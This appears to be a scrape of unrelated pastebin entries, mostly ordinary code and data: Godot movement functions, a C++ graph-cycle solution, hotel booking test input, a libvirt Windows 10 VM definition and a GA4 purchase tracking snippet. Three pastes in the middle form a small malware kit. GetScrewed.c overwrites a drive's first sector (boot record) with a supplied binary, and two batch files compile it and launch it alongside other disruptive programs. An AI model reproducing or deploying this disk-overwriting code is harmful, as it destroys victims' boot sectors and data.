func decelerate(drag: float) -> Vector2:
	return lerp(velocity, Vector2.ZERO, drag)

func accelerate(drag: float) -> Vector2:
	var target_velocity: Vector2 = direction * max_speed
	return lerp(velocity, target_velocity, drag)

func get_direction() -> Vector2:
	var direction: Vector2 = Vector2.ZERO
	direction.y = Input.get_axis(""move_up"", ""move_down"")
	direction.x = Input.get_axis(""move_left"", ""move_right"")
	return direction.normalized()
"
PSUaKh69,Untitled,Josif_tepe,C++,Saturday 19th of August 2023 04:23:01 AM CDT,"#include <iostream>
#include <algorithm>
#include <cstring>
#include <vector>
#include <set>
#include <map>
#include <fstream>
#include <queue>
#include <stack>
using namespace std;
const int maxn = 2e5 + 10;
vector<int> graph[maxn], rev_graph[maxn];
stack<int> st;
bool visited[maxn];
vector<int> cycle;
void topological_sort(int node) {
    visited[node] = true;
    for(int i = 0; i < (int) graph[node].size(); i++) {
        int neighbour = graph[node][i];
        if(!visited[neighbour]) {
            topological_sort(neighbour);
        }
    }
    st.push(node);
}
void dfs(int node) {
    visited[node] = true;
    cycle.push_back(node);
    for(int i = 0; i < (int) rev_graph[node].size(); i++) {
        int neighbour = rev_graph[node][i];
        if(!visited[neighbour]) {
            dfs(neighbour);
        }
    }
}
int main() {
    ios_base::sync_with_stdio(false);
    int t;
    cin >> t;
    
    while(t--) {
        int n;
        cin >> n;
        vector<pair<int, int> > edges;
        for(int i = 0; i < n; i++) {
            int node;
            cin >> node;
            node--;
            graph[i].push_back(node);
            rev_graph[node].push_back(i);
            edges.push_back({i, node});
        }
        memset(visited, false, sizeof visited);
        for(int i = 0; i < n; i++) {
            if(!visited[i]) {
                topological_sort(i);
            }
        }
        memset(visited, false, sizeof visited);
        string result = ""A"";
        int cycles_with_length_of_2 = 0;
        vector<int> cycles_nodes;
        while(!st.empty()) {
            int node = st.top();
            st.pop();
            if(!visited[node]) {
                cycle.clear();
                dfs(node);
                if(cycle.size() > 2) {
                    result = ""B"";
                    break;
                }
                if(cycle.size() == 2) {
                    cycles_with_length_of_2++;
                    cycles_nodes = cycle;
                }
            }
        }
        
        for(int i = 0; i < n; i++) {
            graph[i].clear();
            rev_graph[i].clear();
        }
        while(!st.empty()) {
            st.pop();
        }
        if(cycles_with_length_of_2 > 1) {
            result = ""A"";
        }
        else if(cycles_with_length_of_2 == 1){
            result = ""BOTH"";
//            cout << cycles_nodes[0] << "" "" << cycles_nodes[1] << endl;
            for(int i = 0; i < n; i++) {
                if(cycles_nodes[0] == edges[i].first and cycles_nodes[1] == edges[i].second) continue;
                if(cycles_nodes[1] == edges[i].first and cycles_nodes[0] == edges[i].second) continue;
                
                if(edges[i].second == cycles_nodes[0] or edges[i].second == cycles_nodes[1]) {
                    result = ""BOTH"";
                }
                else {
                    result = ""A"";
                    break;
                }
            }
        }
        cout << result << ""\n"";
    }
    return 0;
}
"
U5p78seb,RAIISTd_5,cepxuozab,C++,Saturday 19th of August 2023 04:13:25 AM CDT,"12
BOOK 10 Hotel1 1 1
BOOK 11 Hotel1 2 1
BOOK 10 Hotel2 1 2
BOOK 11 Hotel2 2 2
BOOK 10 Hotel3 1 3
BOOK 11 Hotel3 2 3
ROOMS Hotel1
ROOMS Hotel2
ROOMS Hotel3
CLIENTS Hotel1
CLIENTS Hotel2
CLIENTS Hotel3

2
4
6
2
2
2"
2Lyizmv0,Win10 virsh XML,Sixcurses,XML,Saturday 19th of August 2023 03:52:01 AM CDT,"<domain type='kvm'>
  <name>Win10</name>
  <uuid>3b1f3110-8690-49aa-a7b3-94cd8ef0aee0</uuid>
  <metadata>
    <libosinfo:libosinfo xmlns:libosinfo=""http://libosinfo.org/xmlns/libvirt/domain/1.0"">
      <libosinfo:os id=""http://microsoft.com/win/10""/>
    </libosinfo:libosinfo>
  </metadata>
  <memory unit='KiB'>16777216</memory>
  <currentMemory unit='KiB'>16777216</currentMemory>
  <vcpu placement='static'>14</vcpu>
  <os firmware='efi'>
    <type arch='x86_64' machine='pc-q35-8.0'>hvm</type>
    <firmware>
      <feature enabled='no' name='enrolled-keys'/>
      <feature enabled='no' name='secure-boot'/>
    </firmware>
    <loader readonly='yes' type='pflash'>/usr/share/edk2/x64/OVMF_CODE.fd</loader>
    <nvram template='/usr/share/edk2/x64/OVMF_VARS.fd'>/var/lib/libvirt/qemu/nvram/Win10_VARS.fd</nvram>
  </os>
  <features>
    <acpi/>
    <apic/>
    <hyperv mode='custom'>
      <relaxed state='on'/>
      <vapic state='on'/>
      <spinlocks state='on' retries='8191'/>
      <vendor_id state='on' value='123456789123'/>
    </hyperv>
    <kvm>
      <hidden state='on'/>
    </kvm>
    <vmport state='off'/>
    <ioapic driver='kvm'/>
  </features>
  <cpu mode='host-passthrough' check='none' migratable='on'>
    <topology sockets='1' dies='1' cores='7' threads='2'/>
    <feature policy='require' name='topoext'/>
  </cpu>
  <clock offset='localtime'>
    <timer name='rtc' tickpolicy='catchup'/>
    <timer name='pit' tickpolicy='delay'/>
    <timer name='hpet' present='no'/>
    <timer name='hypervclock' present='yes'/>
  </clock>
  <on_poweroff>destroy</on_poweroff>
  <on_reboot>restart</on_reboot>
  <on_crash>destroy</on_crash>
  <pm>
    <suspend-to-mem enabled='no'/>
    <suspend-to-disk enabled='no'/>
  </pm>
  <devices>
    <emulator>/usr/bin/qemu-system-x86_64</emulator>
    <controller type='usb' index='0' model='qemu-xhci' ports='15'>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </controller>
    <controller type='pci' index='0' model='pcie-root'/>
    <controller type='pci' index='1' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='1' port='0x10'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='2' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='2' port='0x11'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x1'/>
    </controller>
    <controller type='pci' index='3' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='3' port='0x12'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x2'/>
    </controller>
    <controller type='pci' index='4' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='4' port='0x13'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x3'/>
    </controller>
    <controller type='pci' index='5' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='5' port='0x14'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x4'/>
    </controller>
    <controller type='pci' index='6' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='6' port='0x15'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x5'/>
    </controller>
    <controller type='pci' index='7' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='7' port='0x16'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x6'/>
    </controller>
    <controller type='pci' index='8' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='8' port='0x17'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x7'/>
    </controller>
    <controller type='pci' index='9' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='9' port='0x18'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='10' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='10' port='0x19'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x1'/>
    </controller>
    <controller type='pci' index='11' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='11' port='0x1a'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x2'/>
    </controller>
    <controller type='pci' index='12' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='12' port='0x1b'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x3'/>
    </controller>
    <controller type='pci' index='13' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='13' port='0x1c'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x4'/>
    </controller>
    <controller type='pci' index='14' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='14' port='0x1d'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x5'/>
    </controller>
    <controller type='sata' index='0'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1f' function='0x2'/>
    </controller>
    <controller type='virtio-serial' index='0'>
      <address type='pci' domain='0x0000' bus='0x02' slot='0x00' function='0x0'/>
    </controller>
    <input type='mouse' bus='ps2'/>
    <input type='keyboard' bus='ps2'/>
    <audio id='1' type='none'/>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <source>
        <address domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
      </source>
      <boot order='2'/>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x0'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <source>
        <address domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <source>
        <address domain='0x0000' bus='0x0b' slot='0x00' function='0x0'/>
      </source>
      <rom file='/usr/share/vgabios/1080.rom'/>
      <address type='pci' domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <source>
        <address domain='0x0000' bus='0x0b' slot='0x00' function='0x1'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x07' slot='0x00' function='0x0'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <source>
        <address domain='0x0000' bus='0x08' slot='0x00' function='0x1'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x08' slot='0x00' function='0x0'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <source>
        <address domain='0x0000' bus='0x08' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x09' slot='0x00' function='0x0'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <source>
        <address domain='0x0000' bus='0x0d' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x0a' slot='0x00' function='0x0'/>
    </hostdev>
    <watchdog model='itco' action='reset'/>
    <memballoon model='virtio'>
      <address type='pci' domain='0x0000' bus='0x05' slot='0x00' function='0x0'/>
    </memballoon>
  </devices>
</domain>
"
MhBXGFib,Untitled,lodha1503,C++,Saturday 19th of August 2023 03:32:26 AM CDT,"class Solution
{
    public:
    
    double fractionalKnapsack(int W, Item arr[], int n)
    {
        map<double,pair<int,int>,greater<double>> m;
        
        for(int i=0;i<n;i++)
        {
            double ratio=(1.0*arr[i].value)/arr[i].weight;   
            m[ratio]={arr[i].value,arr[i].weight};
        }
            
        double s=0;
        for(auto x: m)
        {
            if(W==0)
                break;
            int part=min(x.second.second,W);
            W-=part;
            s+=part*((1.0*x.second.first)/x.second.second);

        }
        
        return s;
        
    }
        
};"
udf0gdmK,Runner.bat,FlyFar,Batch,Saturday 19th of August 2023 03:32:25 AM CDT,"@echo off
title RealityCheck
start WebBlock.exe
start GetScrewed.exe
start Shake.exe
start RandomType.vbs
pause
exit"
cE1nFec1,compiling.bat,FlyFar,Batch,Saturday 19th of August 2023 03:30:16 AM CDT,"@echo off
color 17
title c0mP1lE
gcc  WebBlock.c -o  WebBlock.exe
gcc  GetScrewed.c -o  GetScrewed.exe
gcc Shake.c -o filename.exe
pause
exit
"
ZkYtrTrd,GetScrewed.c,FlyFar,C,Saturday 19th of August 2023 03:25:13 AM CDT,"#include <windows.h>
#include <conio.h>
#include <stdio.h>
// Get Screwed!
 
void main(){
    DWORD dw;
    char *pathToBin = ""C:\\Users\\M\\Desktop\\data.bin"";
    HANDLE drive = CreateFile(""\\\\.\\I:"", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive != INVALID_HANDLE_VALUE){
        HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (binary != INVALID_HANDLE_VALUE){
            DWORD size = GetFileSize(binary, 0);
            if (size > 0){
                byte *mbr = new byte[size];
                if (ReadFile(binary, mbr, size, &dw, 0)){
                    printf(""Binary file successfuly read!\n"");
                    //ok,not lets write the contents of the binary file,to the first sector of the drive
                    if (WriteFile(drive, mbr, size, &dw, 0)){
                        printf(""First sector overritten successfuly!\n"");
                    }
                    else
                        printf(""Fatal error! Can't override 1st sector!\n"");
                }
                else
                    printf(""Error reading from binary file!\n"");
            }
            else
                printf(""Invalid binary file!\n"");
        }
        else{
            printf(""Can't find the binary file to read from!\n"");
        }
        CloseHandle(binary);
    }
    else
        printf(""Administrator privileges required!\n"");
    CloseHandle(drive);
    _getch();
}"
ArJ3gQKV,GA4 EC - Mare Tours - purchase,SandroBabic,JavaScript,Saturday 19th of August 2023 03:24:47 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
  event: 'purchase',  			// name of the event. In this case, it always must be purchase
  ecommerce: {
	currency: 'EUR',
    value: 250.00,						// total price of the trip
    transaction_id: 'abc123',			// transaction id
    items: [{                           // an array with all products (that were in a cart when the checkout began)
      item_name: 'Blue Cave',           // insert an actual trip name
      item_id: 'trip1',             // insert an actual trip ID
      price: '250.00',                  // insert an actual trip price. Number or a string. Don't include currency code
      item_category: 'Sea & Boat',          // insert an actual trip top-level category
      product_type: 'Excursions and Tours', 	// in this case, always ""Excursions and Tours""
      trip_location: 'Krk',        // insert a trip location
      booking_type: 'Reservation',		// booking type: Reservation or inquiry
	  country_address_section: 'Germany',				// country from the address section
	  departure_date: '25.08.2023.',		// the date when the trip is booked
      place_of_departure: 'Krk 10:00',		// place of departure and starting time (what is displayed in the dropdown menu)
	  number_of_adults: '4',		// number of adults 12+
	  number_of_youth: '5',			// number of youth
      number_of_children: '3',		// number of children
      quantity: '1'                     // product quantity of how many trips were added to a wishlist, usually always 1
    }]
  }
});"
